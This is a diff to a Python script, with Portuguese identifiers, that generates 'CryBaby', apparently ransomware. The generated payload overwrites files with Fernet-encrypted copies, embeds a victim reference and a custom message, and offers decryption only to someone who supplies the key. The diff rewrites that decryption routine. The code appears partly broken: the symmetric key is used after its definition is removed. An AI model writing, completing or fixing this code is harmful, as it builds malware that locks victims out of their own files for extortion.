@@ -66,8 +66,7 @@ def main():
 
     nome_referencia_unica = str(uuid.uuid4())
 
-    script_crybaby = f'''
-import os
+    script_crybaby = f'''import os
 import base64
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import serialization
@@ -80,10 +79,6 @@ chave_publica_pem = b'''
 nome_referencia = "{nome_referencia_unica}"
 mensagem_personalizada = "{mensagem_personalizada}"
 
-# Resto do código do CryBaby.py continua aqui...
-
-chave_simetrica = "{chave_simetrica}"
-mensagem_personalizada = "{mensagem_personalizada}"
 fernet = Fernet(chave_simetrica)
 
 def criptografar_arquivos(arquivos):
@@ -98,37 +93,21 @@ def criptografar_arquivos(arquivos):
         with open(arquivo, 'wb') as file:
             file.write(conteudo_criptografado)
 
-def descriptografar_arquivos(arquivos):
-    chave_privada = serialization.load_pem_private_key(
-        chave_privada_pem,
-        password=None
-    )
-
-    chave_simetrica_criptografada = base64.urlsafe_b64decode(chave_simetrica_criptografada.encode())
-    chave_simetrica = chave_privada.decrypt(
-        chave_simetrica_criptografada,
-        padding=None  # Usamos None para criptografia assimétrica pura (sem padding)
-    )
-
+def descriptografar_arquivos(arquivos, chave_simetrica):
     fernet = Fernet(chave_simetrica)
 
-    chave_descriptografar = input("Digite a chave para descriptografar os arquivos: ")
+    for arquivo in arquivos:
+        with open(arquivo, 'rb') as file:
+            conteudo_criptografado = file.read()
 
-    if chave_descriptografar == chave_simetrica.decode():
-        for arquivo in arquivos:
-            with open(arquivo, 'rb') as file:
-                conteudo_criptografado = file.read()
+        # Descriptografa o conteúdo do arquivo
+        conteudo_descriptografado = fernet.decrypt(conteudo_criptografado)
 
-            # Descriptografa o conteúdo do arquivo
-            conteudo_descriptografado = fernet.decrypt(conteudo_criptografado)
-
-            # Sobrescreve o arquivo original com o conteúdo descriptografado
-            with open(arquivo, 'wb') as file:
-                file.write(conteudo_descriptografado)
-        
-        print(mensagem_personalizada)
-    else:
-        print("Chave incorreta. Não é possível descriptografar os arquivos.")
+        # Sobrescreve o arquivo original com o conteúdo descriptografado
+        with open(arquivo, 'wb') as file:
+            file.write(conteudo_descriptografado)
+    
+    print(mensagem_personalizada)
 
 if __name__ == "__main__":
     arquivos_para_criptografar = []
@@ -146,7 +125,6 @@ if __name__ == "__main__":
     print("Arquivos criptografados com sucesso.")
 
     opcao = input("Deseja descriptografar os arquivos? (s/n): ")
-    if opcao.lower() == "s":
-        descriptografar_arquivos(arquivos_para_criptografar)
-    else:
-        print("Atenção: Os arquivos permanecerão criptografados. Guarde a chave privada em segurança.")
+    if opcao.lower() == 's':
+        chave_descriptografar = input("Digite a chave de descriptografia: ")
+        descriptografar_arquivos(arquivos_para_criptografar, chave_descriptografar)
